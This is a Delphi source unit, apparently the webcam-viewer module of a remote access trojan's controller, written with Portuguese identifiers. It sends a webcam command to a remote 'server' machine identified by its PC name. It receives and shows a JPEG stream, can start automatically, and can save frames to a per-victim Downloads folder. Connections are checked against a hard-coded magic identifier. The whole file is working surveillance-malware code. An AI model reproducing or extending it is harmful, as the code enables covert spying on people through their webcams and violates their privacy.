unit UnitWebcam;

interface

uses
  StrUtils,Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, Buttons, StdCtrls, UnitMain, JPEG, ComCtrls, Mask, sTrackBar, sUpDown,
  UnitConexao, sSkinProvider;

type
  TFormWebcam = class(TForm)
    ComboBox1: TComboBox;
    AdvTrackBar1: TsTrackBar;
    CheckBox1: TCheckBox;
    Edit1: TEdit;
    Image1: TImage;
    Label1: TLabel;
    SpeedButton1: TButton;
    SpeedButton2: TButton;
    UpDown1: TsUpDown;
    bsSkinStdLabel1: TLabel;
    bsSkinStdLabel2: TLabel;
    StatusBar1: TStatusBar;
    sSkinProvider1: TsSkinProvider;
    procedure FormShow(Sender: TObject);
    procedure SpeedButton1Click(Sender: TObject);
    procedure SpeedButton2Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure UpDown1Change(Sender: TObject);
  private
    { Private declarations }
    Servidor: TConexaoNew;
    ImagemAtual: integer;
    ServidorTransferencia: TConexaoNew;
    LastQuality, LastInterval: integer;
    OriginalCaption: string;
    NomePC: string;
    LiberarForm: boolean;
  	procedure WMCloseFree(var Message: TMessage); message WM_CLOSEFREE;
    procedure AtualizarIdioma;
  	procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
    procedure CreateParams(var Params : TCreateParams); override;
  public
    { Public declarations }
    procedure OnRead(Recebido: String; ConAux: TConexaoNew); overload;
    constructor Create(aOwner: TComponent; ConAux: TConexaoNew); overload;
  end;

var
  FormWebcam: TFormWebcam;

implementation

{$R *.dfm}

uses
  UnitStrings,
  CustomIniFiles,
  UnitCommonProcedures,
  UnitConstantes;

//procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
procedure TFormWebcam.WMAtualizarIdioma(var Message: TMessage);
begin
  AtualizarIdioma;
end;  

procedure TFormWebcam.WMCloseFree(var Message: TMessage);
begin
  LiberarForm := True;
  Close;
end;

//Here's the implementation of CreateParams
procedure TFormWebcam.CreateParams(var Params : TCreateParams);
begin
  inherited CreateParams(Params); //Don't ever forget to do this!!!
  Params.WndParent := GetDesktopWindow;
end;

constructor TFormWebcam.Create(aOwner: TComponent; ConAux: TConexaoNew);
var
  TempStr: WideString;
  IniFile: TIniFile;
begin
  inherited Create(aOwner);

  edit1.OnEnter := FormBase.MudarDeCorEnter;
  edit1.OnExit := FormBase.MudarDeCorExit;

  Servidor := ConAux;
  NomePC := Servidor.NomeDoServidor;

  TempStr := ExtractFilePath(ParamStr(0)) + 'Settings\';
  ForceDirectories(TempStr);
  TempStr := TempStr + NomePC + '.ini';

  if FileExists(TempStr) = True then
  try
    IniFile := TIniFile.Create(TempStr, IniFilePassword);
    Width := IniFile.ReadInteger('Webcam', 'Width', Width);
    Height := IniFile.ReadInteger('Webcam', 'Height', Height);
    Left := IniFile.ReadInteger('Webcam', 'Left', Left);
    Top := IniFile.ReadInteger('Webcam', 'Top', Top);
    AdvTrackBar1.Position := IniFile.ReadInteger('Webcam', 'Quality', AdvTrackBar1.Position);
    UpDown1.Position := IniFile.ReadInteger('Webcam', 'Interval', UpDown1.Position);
    IniFile.Free;
    except
    DeleteFile(TempStr);
  end;

end;

procedure TFormWebcam.AtualizarIdioma;
begin
  SpeedButton1.Caption := traduzidos[256];
  SpeedButton2.Caption := traduzidos[257];
  CheckBox1.Caption := traduzidos[387];
  Label1.Caption := Traduzidos[480];
end;

procedure TFormWebcam.OnRead(Recebido: String; ConAux: TConexaoNew);
var
  TempInt: Int64;
  TempStr: string;
  i: integer;
  Result: TSplit;
  j: TJPegImage;
  Stream: TMemoryStream;
  TempDir: string;
  B: TBitmap;
begin
  if Copy(Recebido, 1, posex('|', Recebido) - 1) = WEBCAMSTART then
  begin
    delete(Recebido, 1, posex('|', recebido));
    SpeedButton2.Visible := True;

    ServidorTransferencia := ConAux;
    ServidorTransferencia.enviarString(
                 WEBCAMSTART + '|' +
                 Inttostr(100 - LastQuality) + '|' +
                 IntToStr(LastInterval) + '|');
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = WEBCAMSTREAM then
  begin
    ServidorTransferencia := ConAux;
    delete(Recebido, 1, posex('|', recebido));
    if (LastQuality <> AdvTrackBar1.Position) or (LastInterval <> UpDown1.Position) then
    begin
      LastQuality := AdvTrackBar1.Position;
      LastInterval := UpDown1.Position;
      Servidor.enviarString(
                   WEBCAMCONFIG + '|' +
                   Inttostr(100 - LastQuality) + '|' +
                   IntToStr(LastInterval) + '|');
    end;
    if recebido = '' then exit;

    Caption := OriginalCaption + ' --- (' + FileSizeToStr(length(Recebido)) + ')';
    inc(imagematual);
    StatusBar1.Panels.Items[0].Text := traduzidos[473] + ': ' + IntToStr(ImagemAtual) + ' --- (' + FileSizeToStr(length(Recebido)) + ')';

    Stream := TMemoryStream.Create;
    Stream.Write(Recebido[1], Length(Recebido) * 2);
    Stream.Position := 0;
    j := TJpegImage.Create;
    j.LoadFromStream(Stream);
    Stream.Free;

    if Checkbox1.Checked = true then
    begin
      TempDir := ExtractFilePath(paramstr(0)) + 'Downloads\' + NomePC + '\WebcamImages';
      ForceDirectories(TempDir);
      j.savetofile(TempDir + '\' + Inttostr(GetTickCount) + '.jpg');
    end;

    B := tbitmap.Create;

    B.Assign(j);
    j.Free;
    Image1.Picture.Bitmap.Assign(b);
    B.Free;
    Self.Refresh;
    Application.ProcessMessages; // para atualizar a imagem no form...
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = WEBCAMSTOP then
  begin
    Close;
  end else

end;
procedure TFormWebcam.FormClose(Sender: TObject; var Action: TCloseAction);
var
  TempStr: WideString;
  IniFile: TIniFile;
begin
  if LiberarForm then Action := caFree;

  TempStr := ExtractFilePath(ParamStr(0)) + 'Settings\';
  ForceDirectories(TempStr);

  TempStr := TempStr + NomePC + '.ini';

  try
    IniFile := TIniFile.Create(TempStr, IniFilePassword);
    IniFile.WriteInteger('Webcam', 'Width', Width);
    IniFile.WriteInteger('Webcam', 'Height', Height);
    IniFile.WriteInteger('Webcam', 'Left', Left);
    IniFile.WriteInteger('Webcam', 'Top', Top);
    IniFile.WriteInteger('Webcam', 'Quality', AdvTrackBar1.Position);
    IniFile.WriteInteger('Webcam', 'Interval', UpDown1.Position);
    IniFile.Free;
    except
    DeleteFile(TempStr);
  end;

  if Servidor = nil then exit;
  if Servidor.MasterIdentification <> 1234567890 then Exit;
  if ServidorTransferencia = nil then Exit;
  try
    if ServidorTransferencia.MasterIdentification = 1234567890 then
    try
      ServidorTransferencia.Connection.Disconnect;
	    except
    end;	
	except
  end;
end;

procedure TFormWebcam.FormCreate(Sender: TObject);
begin
  Self.Left := (screen.width - Self.width) div 2 ;
  Self.top := (screen.height - Self.height) div 2;
  DoubleBuffered := true;
end;

procedure TFormWebcam.FormShow(Sender: TObject);
begin
  AtualizarIdioma;
  StatusBar1.Panels.Items[0].Text := '';
  ImagemAtual := 0;
  LastQuality := AdvTrackBar1.Position;
  LastInterval := UpDown1.Position;
  OriginalCaption := Caption;
  ServidorTransferencia := nil;
  speedbutton2.Visible := false;
  speedbutton1.Visible := true;
  ComboBox1.ItemIndex := 0;
  CheckBox1.Checked := False;


   if FormMain.Timer2.Enabled = true then
  begin

  if not FormMain.AutoWebcam then speedbutton1Click(speedbutton1);
  Checkbox1.Checked := true;
  end;

  if FormMain.AutoWebcam then
  begin
    if ComboBox1.Items.Count <= 0 then ComboBox1.Items.Add('"Default"');
    speedbutton1Click(speedbutton1);
  end;
  Edit1.Text := IntToStr(UpDown1.Position);
end;

procedure TFormWebcam.SpeedButton1Click(Sender: TObject);
begin
  LastQuality := AdvTrackBar1.Position;
  LastInterval := UpDown1.Position;
  speedbutton1.Visible := false;
  speedbutton2.Visible := false;
  Servidor.enviarString(WEBCAM + '|' + IntToStr(ComboBox1.ItemIndex));
  ImagemAtual := 0;
  StatusBar1.Panels.Items[0].Text := traduzidos[205];
end;

procedure TFormWebcam.SpeedButton2Click(Sender: TObject);
begin
  SpeedButton2.Visible := false;
  SpeedButton1.Visible := true;

  if ServidorTransferencia <> nil then
  try
    if ServidorTransferencia.MasterIdentification = 1234567890 then
    try
      ServidorTransferencia.Connection.Disconnect;
	  except
    end;	
	except
  end;

  StatusBar1.Panels.Items[0].Text := '';
end;

procedure TFormWebcam.UpDown1Change(Sender: TObject);
begin
  Edit1.Text := IntToStr(UpDown1.Position);
end;

end.
